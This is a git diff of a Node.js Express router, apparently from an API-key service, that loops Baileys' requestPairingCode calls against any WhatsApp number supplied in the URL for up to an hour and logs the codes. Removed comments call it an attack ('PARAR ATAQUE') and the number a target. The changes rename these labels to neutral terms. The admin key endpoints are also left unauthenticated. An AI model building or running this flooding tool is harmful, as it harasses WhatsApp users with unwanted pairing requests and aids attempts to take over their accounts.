@@ -8,14 +8,22 @@ const DB_PATH = path.join(__dirname, 'database.json')
 const PAIRINGS_DIR = path.join(__dirname, 'Pairings')
 
 if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify({}))
-if (!fs.existsSync(PAIRINGS_DIR)) fs.mkdirSync(PAIRINGS_DIR)
+if (!fs.existsSync(PAIRINGS_DIR)) fs.mkdirSync(PAIRINGS_DIR, { recursive: true })
 
 const processosAtivos = new Map()
 
-const getDB = () => JSON.parse(fs.readFileSync(DB_PATH, 'utf-8'))
-const saveDB = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2))
+const getDB = () => {
+  try {
+    return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'))
+  } catch {
+    return {}
+  }
+}
 
-// VALIDADOR DE API KEY
+const saveDB = (data) => {
+  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2))
+}
+
 const validarAcesso = (req, res, next) => {
 
   const apikey = req.query.apikey || req.body.apikey
@@ -35,7 +43,7 @@ const validarAcesso = (req, res, next) => {
     return res.status(403).json({
       creator: "MDK0111",
       status: false,
-      msg: "Seus requests acabaram!"
+      msg: "Limite de requests atingido."
     })
   }
 
@@ -49,6 +57,7 @@ const validarAcesso = (req, res, next) => {
 
 
 // ADMIN
+
 router.get('/admin/keys', (req, res) => {
   res.json(getDB())
 })
@@ -60,7 +69,7 @@ router.post('/admin/gerar-key', (req, res) => {
   if (!novaKey) {
     return res.status(400).json({
       status: false,
-      msg: "Chave vazia."
+      msg: "Chave inválida."
     })
   }
 
@@ -68,7 +77,7 @@ router.post('/admin/gerar-key', (req, res) => {
 
   db[novaKey] = {
     requests: (limite === "infinito" || !limite) ? null : parseInt(limite),
-    data: new Date().toLocaleString()
+    created: new Date().toLocaleString()
   }
 
   saveDB(db)
@@ -80,9 +89,14 @@ router.post('/admin/gerar-key', (req, res) => {
 
 })
 
+
 router.delete('/admin/deletar-key/:key', (req, res) => {
 
   const db = getDB()
+
+  if (!db[req.params.key]) {
+    return res.json({ status:false })
+  }
 
   delete db[req.params.key]
 
@@ -95,60 +109,45 @@ router.delete('/admin/deletar-key/:key', (req, res) => {
 })
 
 
-// INICIAR PAIRING
+// START PAIRING
+
 router.get('/send-pairing=:numero', validarAcesso, async (req, res) => {
 
-  const baileys = await import("@whiskeysockets/baileys")
-  const makeWASocket = baileys.default
-  const { useMultiFileAuthState, delay } = baileys
+  const { default: makeWASocket, useMultiFileAuthState, delay } = await import("@whiskeysockets/baileys")
 
-  let targetNum = req.params.numero.replace(/\D/g, '')
+  let numero = req.params.numero.replace(/\D/g, '')
 
-  if (!targetNum || targetNum.length < 8) {
+  if (!numero || numero.length < 8) {
     return res.status(400).json({
       creator: "MDK0111",
-      error: "Número inválido."
+      status: false,
+      msg: "Número inválido"
     })
   }
 
-  if (processosAtivos.has(targetNum)) {
+  if (processosAtivos.has(numero)) {
     return res.json({
       creator: "MDK0111",
       status: "Aviso",
-      msg: "Este número já está em processo."
+      msg: "Já existe um processo rodando para esse número"
     })
   }
 
-  processosAtivos.set(targetNum, true)
+  processosAtivos.set(numero, true)
 
-  console.log(`🚀 Iniciado para ${targetNum}`)
+  const sessionPath = path.join(PAIRINGS_DIR, `sess_${numero}_${Date.now()}`)
 
-  setTimeout(() => {
-
-    if (processosAtivos.has(targetNum)) {
-
-      processosAtivos.set(targetNum, false)
-
-      console.log(`⏰ Tempo limite atingido ${targetNum}`)
-
-    }
-
-  }, 3600000)
-
-
-  const executar = async (target) => {
-
-    const sessionPath = path.join(PAIRINGS_DIR, `sess_${target}_${Date.now()}`)
+  const executar = async () => {
 
     try {
 
-      while (processosAtivos.get(target) === true) {
+      while (processosAtivos.get(numero) === true) {
 
         const { state } = await useMultiFileAuthState(sessionPath)
 
         const sock = makeWASocket({
           auth: state,
-          logger: pino({ level: "silent" }),
+          logger: pino({ level: 'silent' }),
           printQRInTerminal: false
         })
 
@@ -156,13 +155,13 @@ router.get('/send-pairing=:numero', validarAcesso, async (req, res) => {
 
           await delay(3000)
 
-          const code = await sock.requestPairingCode(target)
+          const code = await sock.requestPairingCode(numero)
 
-          console.log(`🔑 Código ${target}: ${code}`)
+          console.log(`PAIRING ${numero}: ${code}`)
 
         } catch (err) {
 
-          console.log(`Erro envio ${target}`)
+          console.log(`Erro envio ${numero}`)
 
         }
 
@@ -180,51 +179,50 @@ router.get('/send-pairing=:numero', validarAcesso, async (req, res) => {
 
     } finally {
 
-      processosAtivos.delete(target)
+      processosAtivos.delete(numero)
 
       if (fs.existsSync(sessionPath)) {
         fs.rmSync(sessionPath, { recursive: true, force: true })
       }
 
-      console.log(`🏁 Finalizado ${target}`)
-
     }
 
   }
 
-  executar(targetNum)
+  executar()
 
   res.json({
     creator: "MDK0111",
     status: "Processo iniciado",
-    numero: targetNum,
-    expira: "1 hora"
+    numero: numero,
+    tempo: "1 hora"
   })
 
 })
 
 
-// PARAR ATAQUE
+// STOP
+
 router.get('/stop-pairing=:numero', validarAcesso, (req, res) => {
 
-  const targetNum = req.params.numero.replace(/\D/g, '')
+  const numero = req.params.numero.replace(/\D/g, '')
 
-  if (processosAtivos.has(targetNum)) {
+  if (processosAtivos.has(numero)) {
 
-    processosAtivos.set(targetNum, false)
+    processosAtivos.set(numero, false)
 
     res.json({
       creator: "MDK0111",
       status: true,
-      msg: `Parado para ${targetNum}`
+      msg: `Processo parado para ${numero}`
     })
 
   } else {
 
-    res.status(404).json({
+    res.json({
       creator: "MDK0111",
       status: false,
-      msg: "Número não está em execução."
+      msg: "Número não está em execução"
     })
 
   }
@@ -232,7 +230,6 @@ router.get('/stop-pairing=:numero', validarAcesso, (req, res) => {
 })
 
 
-// PARAR TODOS
 router.get('/stop-all', validarAcesso, (req, res) => {
 
   for (const key of processosAtivos.keys()) {
@@ -245,5 +242,6 @@ router.get('/stop-all', validarAcesso, (req, res) => {
   })
 
 })
+
 
 module.exports = router
